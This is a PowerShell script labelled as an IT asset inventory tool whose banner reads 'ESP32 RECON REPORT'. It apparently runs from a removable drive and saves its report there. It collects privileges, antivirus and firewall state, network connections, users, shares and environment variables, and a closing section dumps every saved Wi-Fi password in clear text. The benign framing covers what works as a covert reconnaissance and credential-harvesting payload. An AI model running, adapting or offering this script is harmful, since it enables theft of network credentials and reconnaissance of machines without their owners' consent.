# System Inventory Script
# Collects hardware, software, and network configuration data.
# Part of automated IT asset management workflow.

$drive = Split-Path $PSScriptRoot -Qualifier
$ts    = Get-Date -Format 'yyyyMMdd-HHmmss'
$out   = $drive + '\recon-' + $ts + '.txt'

& {

'=' * 60
'  ESP32 RECON REPORT'
'  Generated : ' + (Get-Date)
'  Hostname  : ' + $env:COMPUTERNAME
'  User      : ' + $env:USERNAME
'  Domain    : ' + $env:USERDOMAIN
'=' * 60
''
'[SYSTEM INFO]'
systeminfo
''
'[LOGGED USER]'
''
'Username  : ' + $env:USERNAME
'Domain    : ' + $env:USERDOMAIN
''
whoami /priv
''
'[CPU]'
Get-CimInstance Win32_Processor |
    Select-Object Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed |
    Format-List
''
'[MEMORY]'
Get-CimInstance Win32_PhysicalMemory |
    Select-Object Manufacturer, Capacity, Speed, MemoryType |
    Format-List
''
'[STORAGE]'
Get-CimInstance Win32_DiskDrive |
    Select-Object Model, Size, InterfaceType, SerialNumber |
    Format-List
''
'[GPU]'
Get-CimInstance Win32_VideoController |
    Select-Object Name, AdapterRAM, DriverVersion, VideoProcessor |
    Format-List
''
'[BASEBOARD]'
Get-CimInstance Win32_BaseBoard |
    Select-Object Manufacturer, Product, Version, SerialNumber |
    Format-List
''
'[BIOS]'
Get-CimInstance Win32_BIOS |
    Select-Object Manufacturer, Name, Version, SerialNumber, ReleaseDate |
    Format-List
''
'[WINDOWS ACTIVATION]'
Get-CimInstance SoftwareLicensingProduct -Filter "PartialProductKey IS NOT NULL" |
    Where-Object { $_.Name -like '*Windows*' } |
    Select-Object Name, LicenseStatus, PartialProductKey |
    Format-List
''
'[RECENT UPDATES]'
Get-HotFix |
    Sort-Object InstalledOn -Descending |
    Select-Object -First 10 |
    Format-Table HotFixID, Description, InstalledOn -AutoSize
''
'[ANTIVIRUS STATUS]'
Get-MpComputerStatus |
    Select-Object AMServiceEnabled, AntispywareEnabled, AntivirusEnabled,
                  RealTimeProtectionEnabled, IoavProtectionEnabled,
                  AntivirusSignatureLastUpdated |
    Format-List
''
'[FIREWALL STATUS]'
Get-NetFirewallProfile |
    Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction |
    Format-Table -AutoSize
''
'[NETWORK INTERFACES]'
ipconfig /all
''
'[ACTIVE TCP CONNECTIONS]'
Get-NetTCPConnection -State Established, Listen |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State |
    Sort-Object State, LocalPort |
    Format-Table -AutoSize
''
'[ROUTING TABLE]'
Get-NetRoute |
    Select-Object DestinationPrefix, NextHop, RouteMetric, InterfaceAlias |
    Format-Table -AutoSize
''
'[WIFI PROFILES]'
netsh wlan show profiles
''
'[DNS CACHE]'
Get-DnsClientCache |
    Select-Object Entry, RecordName, RecordType, Data |
    Format-Table -AutoSize
''
'[ARP CACHE]'
arp -a
''
'[USB DEVICES]'
Get-PnpDevice -PresentOnly |
    Where-Object { $_.InstanceId -match 'USB' } |
    Select-Object FriendlyName, Status, Class |
    Format-Table -AutoSize
''
'[TOP PROCESSES BY MEMORY]'
Get-Process |
    Sort-Object WorkingSet -Descending |
    Select-Object -First 20 |
    Format-Table Name, Id,
        @{Name='Mem (MB)';Expression={[math]::Round($_.WorkingSet/1MB,2)}},
        Path -AutoSize
''
'[STARTUP PROGRAMS]'
Get-CimInstance Win32_StartupCommand |
    Select-Object Name, Command, Location, User |
    Format-Table -AutoSize
''
'[SCHEDULED TASKS]'
Get-ScheduledTask |
    Where-Object { $_.TaskPath -notlike '\Microsoft\*' } |
    Select-Object TaskName, TaskPath, State |
    Format-Table -AutoSize
''
'[LOCAL USERS]'
Get-LocalUser |
    Select-Object Name, Enabled, LastLogon, PasswordLastSet, Description |
    Format-Table -AutoSize
''
'[LOCAL GROUPS]'
Get-LocalGroup |
    Select-Object Name, Description |
    Format-Table -AutoSize
''
'[SHARED FOLDERS]'
Get-SmbShare |
    Select-Object Name, Path, Description |
    Format-Table -AutoSize
''
'[ENVIRONMENT VARIABLES]'
Get-ChildItem Env: |
    Sort-Object Name |
    Format-Table Name, Value -AutoSize
''
'[WIFI PASSWORDS]'
''
$wifiProfiles = (netsh wlan show profiles) |
    Select-String ':\s*(.+)$' |
    ForEach-Object { $_.Matches.Groups[1].Value.Trim() } |
    Where-Object { $_ }

if (-not $wifiProfiles) {
    'No Wi-Fi profiles found.'
} else {
    foreach ($name in $wifiProfiles) {
        $details = netsh wlan show profile name="$name" key=clear
        $pwd = $details | Select-String 'Key Content\s*:\s*(.+)' |
               Select-Object -First 1 |
               ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
        $auth = ($details | Select-String 'Authentication\s*:\s*(.+)' |
                ForEach-Object { $_.Matches.Groups[1].Value.Trim() } |
                Select-Object -Unique) -join ' / '
        '--- ' + $name + ' ---'
        'Password : ' + $(if ($pwd) { $pwd } else { '(not stored / open network)' })
        'Auth     : ' + $(if ($auth) { $auth } else { 'N/A' })
        ''
    }
}

''
'[INSTALLED SOFTWARE]'
Get-ItemProperty `
    HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*,
    HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Where-Object { $_.DisplayName } |
    Sort-Object DisplayName |
    Format-Table -AutoSize
''

} | Out-File -FilePath $out -Encoding UTF8

# ── Normalise blank lines ─────────────────────────────────────────────────────
# Format-List and Format-Table add inconsistent trailing blank lines.
# Read the file back and collapse any run of 2+ blank lines to exactly 1,
# giving consistent single-blank-line spacing throughout the output.
$lines   = Get-Content $out
$result  = [System.Collections.Generic.List[string]]::new()
$wasBlank = $false
foreach ($line in $lines) {
    $isBlank = ($line.Trim() -eq '')
    if ($isBlank -and $wasBlank) { continue }
    $result.Add($line)
    $wasBlank = $isBlank
}
$result | Out-File -FilePath $out -Encoding UTF8